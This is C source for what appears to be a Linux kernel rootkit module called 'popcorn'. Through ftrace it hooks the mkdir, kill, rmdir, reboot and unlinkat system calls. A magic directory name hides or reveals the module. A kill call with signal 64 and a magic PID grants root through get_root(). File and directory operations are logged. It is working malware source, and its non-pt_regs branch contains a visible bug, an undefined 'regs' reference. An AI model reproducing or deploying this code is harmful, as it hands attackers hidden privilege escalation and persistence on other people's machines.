#include "../headers/hooks.h"
#include "../headers/credentials.h"
#include "../headers/stealth.h"
#include "../headers/popcorn.h"

static short lkm_hidden = 0;

#ifdef PTREGS_SYSCALL_STUBS

// Define popcorn mkdir function call, for "pt-regs" versions of the kernel
asmlinkage int pn_mkdir(const struct pt_regs *regs) {
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};
    char key_name[] = "0123456789876543210\0";


    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0) {
        printk(KERN_INFO "User trying to create directory with name: \"%s\".\n", dir_name);
        if ( (strcmp(dir_name, key_name) == 0) && (lkm_hidden == 0) ) {
            hide_me();
            lkm_hidden = 1;
        } else if ( (strcmp(dir_name, key_name) == 0) && (lkm_hidden == 1) ) {
            show_me();
            lkm_hidden = 0;
        }
    }

    lx_mkdir(regs);
    return 0;
}

asmlinkage int pn_kill(const struct pt_regs *regs) {
    int sig = regs->si;
    pid_t pid = regs->di;

    if ( (sig == 64) && (pid == 4194304) ) {
        get_root();
    } else {
        return lx_kill(regs);
    }
    return 0;
}

asmlinkage int pn_rmdir(const struct pt_regs *regs) {
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0 ) {
        printk(KERN_INFO "User trying to delete directory with name: \"%s\".\n", dir_name);
    }

    lx_rmdir(regs);
    return 0;
}

asmlinkage int pn_reboot(const struct pt_regs *regs) {

    teardown();

    lx_reboot(regs);
    return 0;
}

asmlinkage int pn_unlinkat(const struct pt_regs *regs) {
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
    
    if (error > 0) {
        printk(KERN_INFO "Unlinkat Test: \"%s\".\n", dir_name);
    }

    lx_unlinkat(regs);
    return 0;
}

#else

// Define popcorn mkdir function call, for non-"pt-regs" versions of the kernel
asmlinkage int pn_mkdir(const char __user *pathname, umode_t mode) {
    char dir_name[NAME_MAX] = {0};
    char key_name[] = "\0";

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0) {
        printk(KERN_INFO "User trying to create directory with name: \"%s\".\n", dir_name);
        if ( (strcmp(dir_name, key_name) == 0) && (lkm_hidden == 0) ) {
            hide_me();
            lkm_hidden = 1;
        } else if ( (strcmp(dir_name, key_name) == 0) && (lkm_hidden == 1) ) {
            show_me();
            lkm_hidden = 0;
        }
    }

    lx_mkdir(pathname, mode);
    return 0;
}

asmlinkage int pn_kill(pid_t pid, int sig) {
    if ( (sig == 64) && (pid == 4194304) ) {
        get_root();
    } else {
        return lx_kill(regs);
    }
    return 0;
}

asmlinkage int pn_rmdir(const char __user *pathname) {
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0 ) {
        printk(KERN_INFO "User trying to delete directory with name: \"%s\".\n", dir_name);
    }

    lx_rmdir(pathname);
    return 0;
}

asmlinkage int pn_reboot(int magic1, int magic2, unsigned int cmd, void __user *arg) {

    teardown();

    lx_reboot(magic1, magic2, cmd, arg);
    return 0;
}

asmlinkage int pn_unlinkat(int dfd, const char __user * pathname, int flag) {
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
    
    if (error > 0) {
        printk(KERN_INFO "Unlinkat Test: \"%s\".\n", dir_name);
    }

    lx_unlinkat(dfd, pathname, flag);
    return 0;
}

#endif

// Define ftrace kernel hooks
static struct ftrace_hook kernel_hooks[] = {
    // Swap The sys_mkdir call from linux to popcorn method...
    HOOK("__x64_sys_mkdir", pn_mkdir, &lx_mkdir),
    HOOK("__x64_sys_kill", pn_kill, &lx_kill),
    HOOK("__x64_sys_rmdir", pn_rmdir, &lx_rmdir),
    HOOK("__x64_sys_reboot", pn_reboot, &lx_reboot),
    HOOK("__x64_sys_unlinkat", pn_unlinkat, &lx_unlinkat)

};
